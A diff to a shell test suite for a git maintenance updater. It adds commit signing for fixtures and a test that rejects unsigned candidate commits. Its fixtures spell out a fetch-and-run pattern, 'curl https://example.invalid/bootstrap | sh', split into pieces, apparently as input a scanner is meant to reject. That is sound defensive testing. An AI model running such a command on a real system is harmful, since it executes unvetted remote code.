@@ -9,6 +9,9 @@ REAL_BWRAP=$(command -v bwrap || true)
 TEST_BWRAP_BIN=''
 TEST_BWRAP_MODE=''
 TEST_TIMEOUT_BIN="$TEST_ROOT/timeout-contract.sh"
+FIXTURE_SIGNING_KEY="$TEST_ROOT/maintenance-signing-key"
+
+ssh-keygen -q -t ed25519 -N '' -f "$FIXTURE_SIGNING_KEY"
 
 cleanup() {
     case $TEST_ROOT in
@@ -88,7 +91,11 @@ _maintenance_git_trusted_binary() {
 
 fixture_git() {
     "$REAL_GIT" -c user.name='Maintenance Git Fixture' \
-        -c user.email='fixture@example.invalid' "$@"
+        -c user.email='fixture@example.invalid' \
+        -c gpg.format=ssh \
+        -c user.signingkey="$FIXTURE_SIGNING_KEY" \
+        -c commit.gpgsign=true \
+        "$@"
 }
 
 write_candidate_entrypoints() {
@@ -159,7 +166,10 @@ setup_fixture() {
     fixture_git init -q --bare "$ORIGIN"
     fixture_git init -q --initial-branch=main "$AUTHOR"
     write_candidate_entrypoints "$AUTHOR"
-    mkdir -p -- "$AUTHOR/docs"
+    mkdir -p -- "$AUTHOR/docs" "$AUTHOR/.config/git"
+    printf 'fixture@example.invalid %s\n' \
+        "$(cat "$FIXTURE_SIGNING_KEY.pub")" \
+        > "$AUTHOR/.config/git/allowed_signers"
     policy='Policy: never use `cu'
     policy+='rl | sh` installers.'
     printf '%s\n' "$policy" > "$AUTHOR/docs/security-policy.md"
@@ -389,6 +399,25 @@ run_candidate_timeout() {
     assert_no_candidate_execution "$TX_DIR"
 }
 
+run_unsigned_candidate_rejected() {
+    reset_transaction_context
+    setup_fixture unsigned-candidate
+    printf 'unsigned candidate\n' > "$AUTHOR/unsigned.txt"
+    fixture_git -C "$AUTHOR" add unsigned.txt
+    fixture_git -c commit.gpgsign=false -C "$AUTHOR" \
+        commit -qm 'unsigned candidate revision'
+    fixture_git -C "$AUTHOR" push -q origin main
+    CANDIDATE_COMMIT=$(fixture_git -C "$AUTHOR" rev-parse HEAD)
+    begin_transaction "$CASE_ROOT" "$CURRENT_COMMIT"
+
+    if maintenance_git_prepare "$TX_DIR" "$ACTIVE" >/dev/null 2>&1; then
+        fail 'an unsigned incoming candidate was accepted'
+    fi
+    assert_no_candidate_execution "$TX_DIR"
+    assert_head "$ACTIVE" "$CURRENT_COMMIT" \
+        'unsigned candidate rejection changed active HEAD'
+}
+
 run_scan_rejection() {
     local class=$1 path=$2 content=$3 requested_mode=${4:-}
 
@@ -614,6 +643,7 @@ run_diverged_rejected
 run_candidate_failure fail-audit 43 null
 run_candidate_failure fail-check 0 42
 run_candidate_timeout
+run_unsigned_candidate_rejected
 
 unsafe_bootstrap='curl https://example.invalid/bootstrap'
 unsafe_bootstrap+=' | sh'
